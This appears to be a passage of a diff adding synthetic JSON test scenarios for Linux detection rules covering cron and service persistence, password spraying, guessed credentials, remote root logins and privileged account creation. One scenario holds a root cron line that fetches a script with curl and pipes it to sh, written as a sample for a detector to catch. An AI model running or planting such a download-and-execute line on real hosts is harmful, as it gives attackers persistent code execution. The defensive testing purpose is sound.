+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "A new service is an observation: planned deployments produce the same result."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:ssh.service",
+      "attributes": {
+       "name": "ssh.service",
+       "path": "/usr/sbin/sshd -D"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-PER-011",
+   "title": "No service change since the baseline",
+   "description": "Same services as the baseline.",
+   "objective": "An unchanged environment produces no change detections.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "service",
+    "change",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:ssh.service",
+      "attributes": {
+       "name": "ssh.service",
+       "path": "/usr/sbin/sshd -D"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "service",
+      "key": "service:ssh.service",
+      "attributes": {
+       "name": "ssh.service",
+       "path": "/usr/sbin/sshd -D"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-PER-012",
+   "title": "Scheduled task modified to download and execute",
+   "description": "A task that existed in the baseline now runs a download-and-execute command.",
+   "objective": "The modified task is flagged by its content (HTSK-001) even though it is not new.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root curl -s http://203.0.113.9/b.sh | sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HTSK-001",
+      "count": 1
+     }
+    ],
+    "absent": [
+     "DR-ANY-HCHG-005"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Modification of a task is not itself reported: HCHG-005 only reports added tasks. A benign edit is invisible and a malicious edit is caught only by its content."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root /usr/local/sbin/backup.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-PER-013",
+   "title": "New scheduled task since the baseline",
+   "description": "A cron entry that the baseline did not have.",
+   "objective": "HCHG-005 reports a new scheduled task.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root /usr/local/sbin/backup.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     },
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/new",
+      "attributes": {
+       "name": "/etc/cron.d/new",
+       "command": "0 3 * * * root /usr/local/sbin/new.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HCHG-005",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root /usr/local/sbin/backup.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-PER-014",
+   "title": "Scheduled tasks unchanged",
+   "description": "Same tasks as the baseline.",
+   "objective": "No new-task detection when nothing is new.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "persistence",
+    "scheduled-task",
+    "change",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root /usr/local/sbin/backup.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-005"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "scheduled_task",
+      "key": "task:/etc/cron.d/backup",
+      "attributes": {
+       "name": "/etc/cron.d/backup",
+       "command": "0 2 * * * root /usr/local/sbin/backup.sh",
+       "user": "root"
+      },
+      "scope": "cron"
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-AUT-001",
+   "title": "Successful administrator login",
+   "description": "alice logs in from an internal address and runs sudo.",
+   "objective": "Normal successful authentication and administrative activity produce no authentication detections.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "benign",
+    "admin"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_success|alice|10.0.0.9",
+      "attributes": {
+       "action": "login_success",
+       "result": "success",
+       "user": "alice",
+       "source_address": "10.0.0.9",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e2|2026-03-01T09:01:00Z|sudo|alice|",
+      "attributes": {
+       "action": "sudo",
+       "result": "success",
+       "user": "alice",
+       "source_address": null,
+       "service": "sshd",
+       "method": "command",
+       "actor": "root"
+      },
+      "event_time": "2026-03-01T09:01:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e3|2026-03-01T09:02:00Z|su|alice|",
+      "attributes": {
+       "action": "su",
+       "result": "success",
+       "user": "alice",
+       "source_address": null,
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:02:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HAUTH-001",
+     "DR-ANY-HAUTH-002",
+     "DR-ANY-HAUTH-003",
+     "DR-ANY-HAUTH-004"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-002",
+   "title": "A single failed login",
+   "description": "One mistyped password.",
+   "objective": "A single failure is not a pattern.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|alice|10.0.0.9",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "10.0.0.9",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HAUTH-001",
+     "DR-ANY-HAUTH-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-003",
+   "title": "Password spraying",
+   "description": "Twelve failures from one address across three accounts.",
+   "objective": "HAUTH-001 reports repeated failures across accounts.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "pattern"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e0|2026-03-01T09:00:00Z|login_failure|root|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "root",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:01:00Z|login_failure|admin|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "admin",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:01:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e2|2026-03-01T09:02:00Z|login_failure|bob|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "bob",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:02:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e3|2026-03-01T09:03:00Z|login_failure|root|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "root",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:03:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e4|2026-03-01T09:04:00Z|login_failure|admin|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "admin",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:04:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e5|2026-03-01T09:05:00Z|login_failure|bob|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "bob",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:05:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e6|2026-03-01T09:06:00Z|login_failure|root|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "root",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:06:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e7|2026-03-01T09:07:00Z|login_failure|admin|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "admin",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:07:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e8|2026-03-01T09:08:00Z|login_failure|bob|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "bob",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:08:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e9|2026-03-01T09:09:00Z|login_failure|root|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "root",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:09:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e10|2026-03-01T09:10:00Z|login_failure|admin|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "admin",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:10:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e11|2026-03-01T09:11:00Z|login_failure|bob|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "bob",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:11:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HAUTH-001",
+      "count": 1,
+      "severity": {
+       "min": "medium",
+       "max": "medium"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "The window is whatever the collector read; thresholds are judgment calls."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-004",
+   "title": "Many failures against one account",
+   "description": "Twelve identical failures against one account (a stale automation credential).",
+   "objective": "Volume without breadth is not password spraying; repeated identical lines are merged, not multiplied.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_failure|svc-backup|10.0.0.20",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "svc-backup",
+       "source_address": "10.0.0.20",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HAUTH-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-005",
+   "title": "Success after repeated failures",
+   "description": "Six failures then a success from the same address.",
+   "objective": "HAUTH-002 reports the pattern of a guessed credential.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "pattern"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e0|2026-03-01T09:00:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:01:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:01:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:02:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e3|2026-03-01T09:03:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:03:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e4|2026-03-01T09:04:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:04:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e5|2026-03-01T09:05:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:05:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e90|2026-03-01T09:30:00Z|login_success|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_success",
+       "result": "success",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:30:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HAUTH-002",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-006",
+   "title": "Success before the failures",
+   "description": "alice logged in, then a later burst of failures from the same address.",
+   "objective": "Order matters: a success that precedes the failures is not a guessed credential.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "pattern",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e90|2026-03-01T08:00:00Z|login_success|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_success",
+       "result": "success",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T08:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e0|2026-03-01T09:00:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:01:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:01:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e2|2026-03-01T09:02:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:02:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e3|2026-03-01T09:03:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:03:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e4|2026-03-01T09:04:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:04:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e5|2026-03-01T09:05:00Z|login_failure|alice|203.0.113.5",
+      "attributes": {
+       "action": "login_failure",
+       "result": "failure",
+       "user": "alice",
+       "source_address": "203.0.113.5",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:05:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HAUTH-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-007",
+   "title": "Remote root login",
+   "description": "root logs in over SSH from an external address.",
+   "objective": "HAUTH-003 reports a direct remote login to a built-in administrative account.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "privilege"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|login_success|root|203.0.113.77",
+      "attributes": {
+       "action": "login_success",
+       "result": "success",
+       "user": "root",
+       "source_address": "203.0.113.77",
+       "service": "sshd"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HAUTH-003",
+      "count": 1,
+      "severity": {
+       "max": "medium"
+      },
+      "confidence": {
+       "max": "medium"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "An observation about practice: some environments allow it."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-008",
+   "title": "Account created and made administrator",
+   "description": "useradd then usermod -aG sudo for the same new account.",
+   "objective": "HAUTH-004 correlates account creation with a privileged group addition.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "privilege",
+    "correlation"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|account_change|backdoor|",
+      "attributes": {
+       "action": "account_change",
+       "result": "success",
+       "user": "backdoor",
+       "source_address": null,
+       "service": "sshd",
+       "change": "created"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     },
+     {
+      "category": "auth_event",
+      "key": "e2|2026-03-01T09:00:05Z|group_change|backdoor|",
+      "attributes": {
+       "action": "group_change",
+       "result": "success",
+       "user": "backdoor",
+       "source_address": null,
+       "service": "sshd",
+       "change": "member_added",
+       "group": "sudo"
+      },
+      "event_time": "2026-03-01T09:00:05Z"
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HAUTH-004",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Planned onboarding looks identical."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-009",
+   "title": "Account created without privilege",
+   "description": "A service account is created and nothing else happens.",
+   "objective": "Account creation alone is not flagged.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "auth_event",
+      "key": "e1|2026-03-01T09:00:00Z|account_change|svc-new|",
+      "attributes": {
+       "action": "account_change",
+       "result": "success",
+       "user": "svc-new",
+       "source_address": null,
+       "service": "sshd",
+       "change": "created"
+      },
+      "event_time": "2026-03-01T09:00:00Z"
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HAUTH-004"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-010",
+   "title": "Authentication logs inaccessible",
+   "description": "The collector could not read /var/log/auth.log and the journal (unprivileged run).",
+   "objective": "Missing authentication data is reported as unavailable, never as 'no failed logins'.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "coverage",
+    "permissions"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     }
+    ],
+    "coverage": {
+     "auth_event": "unavailable"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HAUTH-001",
+      "reason_contains": "could not be collected"
+     },
+     {
+      "rule": "DR-ANY-HAUTH-002",
+      "reason_contains": "could not be collected"
+     },
+     {
+      "rule": "DR-ANY-HAUTH-003"
+     },
+     {
+      "rule": "DR-ANY-HAUTH-004"
+     }
+    ],
+    "coverage": {
+     "auth_event": "unavailable"
+    }
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-AUT-011",
+   "title": "Journal readable only in part",
+   "description": "An unprivileged user reads the journal: zero events returned and coverage is partial.",
+   "objective": "Zero events from a restricted source do not prove there were no attacks.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "authentication",
+    "coverage",
+    "permissions"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
